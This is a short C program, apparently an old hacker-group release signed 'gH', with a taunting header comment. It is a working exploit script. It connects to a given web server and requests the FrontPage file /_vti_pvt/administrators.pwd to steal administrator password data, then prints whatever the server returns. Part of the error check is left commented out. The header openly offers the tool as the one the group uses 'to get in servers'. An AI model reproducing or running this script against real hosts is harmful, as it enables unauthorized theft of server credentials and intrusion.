/* 
Hi there, this is from the gH (gLoBaL HeLL). We decided to show you
guys exactly how elite we are. We're letting the secret out finally, this
is how we do all of those elite japanese hacks! We also need to tell you
guys another secret, I-L and eCh0 are sexy as hell! And no we don't mean
those ech0 security (the /src is the root of our horse). God...one day we
will stop showing hostility to eCh0 and I-L and finally tell them how we
feel in person, but until then, enjoy the /<-r4d 3xpl01t that we use to
get in servers.
*/

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

int main (int argc, char *argv[]) {
char fpage[]="GET /_vti_pvt/administrators.pwd\r\n";
int sock;
struct sockaddr_in sin;
struct hostent *he;
char buf[1000];

if(argc != 2) {
   fprintf(stderr, "     Frontpage Bug! 37337 Only!\n");
   fprintf(stderr, "         By gH\n");
   fprintf(stderr, "     Usage is: %s Host\n", argv[0]);
   exit(0);
}

if((he=gethostbyname(argv[1])) == -1) {
   printf("Error with getting host\n");
   exit(0);
}

sock=socket(AF_INET, SOCK_STREAM, 0);
bcopy(he->h_addr, (char *)&sin.sin_addr, he->h_length);
sin.sin_family = AF_INET;
sin.sin_port = htons(80);

if (connect(sock, (struct sockaddr*)&sin, sizeof(sin))!=0) {
     perror("connect"); }

send(sock, fpage, sizeof(fpage), 0);
recv(sock, buf, sizeof(buf),0);

/* Us here at gH were to lazy to finish this     */
/*if(!memcmp(buf, error, 100)) {                 */
/*   printf("Ugh, they don't have tha bug!");    */
/*   exit(0);                                    */
/*}                                              */
fprintf(stderr, "Received:\n%s\n", buf);
close(sock);
exit(0);
}
/* Debris is mad cool */
